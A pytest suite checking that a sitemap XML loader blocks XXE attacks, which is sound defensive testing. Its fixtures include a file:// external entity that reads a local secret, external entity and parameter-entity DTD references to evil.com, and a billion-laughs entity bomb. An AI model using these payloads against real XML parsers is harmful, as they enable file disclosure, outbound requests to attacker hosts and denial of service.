#!/usr/bin/env python3
"""Tests for XXE (XML External Entity) attack prevention in sitemap parsing"""
import pytest
import tempfile
from pathlib import Path
from lxml import etree

from src.batch import load_sitemap_xml


class TestXXEPrevention:
    """Test suite for XML External Entity (XXE) vulnerability prevention"""

    def test_parse_valid_sitemap(self, tmp_path):
        """Valid sitemap.xml should parse successfully"""
        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://www.landsiedel.com/de/page1</loc>
  </url>
  <url>
    <loc>https://www.landsiedel.com/de/page2</loc>
  </url>
</urlset>
""", encoding='utf-8')

        urls = load_sitemap_xml(str(sitemap))

        assert len(urls) == 2
        assert "https://www.landsiedel.com/de/page1" in urls
        assert "https://www.landsiedel.com/de/page2" in urls

    def test_reject_external_entity_file(self, tmp_path):
        """XML with external file entity should be rejected"""
        # Create a file to be referenced
        secret = tmp_path / "secret.txt"
        secret.write_text("SENSITIVE_DATA", encoding='utf-8')

        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
  <!ENTITY xxe SYSTEM "file://{secret}">
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>&xxe;</loc>
  </url>
</urlset>
""", encoding='utf-8')

        # Should not resolve the external entity
        urls = load_sitemap_xml(str(sitemap))

        # The entity should not be resolved, so no valid URLs
        assert len(urls) == 0
        # Verify that sensitive data was NOT leaked
        for url in urls:
            assert "SENSITIVE_DATA" not in url

    def test_reject_external_entity_url(self, tmp_path):
        """XML with external URL entity should be rejected"""
        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
  <!ENTITY xxe SYSTEM "http://evil.com/attack.txt">
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>&xxe;</loc>
  </url>
</urlset>
""", encoding='utf-8')

        # Should not make network request or resolve entity
        urls = load_sitemap_xml(str(sitemap))

        # Entity should not be resolved
        assert len(urls) == 0

    def test_reject_parameter_entity(self, tmp_path):
        """XML with parameter entity should be rejected"""
        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://www.landsiedel.com/de/page1</loc>
  </url>
</urlset>
""", encoding='utf-8')

        # Should not load external DTD or make network request
        urls = load_sitemap_xml(str(sitemap))

        # Should still parse the valid URL since DTD is ignored
        assert len(urls) == 1
        assert "https://www.landsiedel.com/de/page1" in urls

    def test_reject_billion_laughs(self, tmp_path):
        """XML bomb (billion laughs attack) should be handled safely"""
        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>&lol3;</loc>
  </url>
</urlset>
""", encoding='utf-8')

        # Should not expand entities exponentially
        urls = load_sitemap_xml(str(sitemap))

        # Entity should not be resolved
        assert len(urls) == 0

    def test_reject_dtd_declaration(self, tmp_path):
        """XML with inline DTD declarations should not cause issues"""
        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
  <!ELEMENT urlset ANY>
  <!ELEMENT url ANY>
  <!ELEMENT loc (#PCDATA)>
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://www.landsiedel.com/de/test</loc>
  </url>
</urlset>
""", encoding='utf-8')

        # Should ignore DTD but parse valid content
        urls = load_sitemap_xml(str(sitemap))

        assert len(urls) == 1
        assert "https://www.landsiedel.com/de/test" in urls

    def test_malformed_xml_raises_error(self, tmp_path):
        """Malformed XML should raise XMLSyntaxError"""
        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://www.landsiedel.com/de/page1
  </url>
</urlset>
""", encoding='utf-8')

        with pytest.raises(etree.XMLSyntaxError):
            load_sitemap_xml(str(sitemap))

    def test_empty_sitemap(self, tmp_path):
        """Empty but valid sitemap should return empty list"""
        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
</urlset>
""", encoding='utf-8')

        urls = load_sitemap_xml(str(sitemap))

        assert len(urls) == 0

    def test_filter_non_de_urls(self, tmp_path):
        """URLs not matching /de/ pattern should be filtered out"""
        sitemap = tmp_path / "sitemap.xml"
        sitemap.write_text("""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://www.landsiedel.com/de/page1</loc>
  </url>
  <url>
    <loc>https://www.landsiedel.com/en/page2</loc>
  </url>
  <url>
    <loc>https://example.com/de/page3</loc>
  </url>
</urlset>
""", encoding='utf-8')

        urls = load_sitemap_xml(str(sitemap))

        # Only the /de/ URL from www.landsiedel.com should pass
        assert len(urls) == 1
        assert "https://www.landsiedel.com/de/page1" in urls
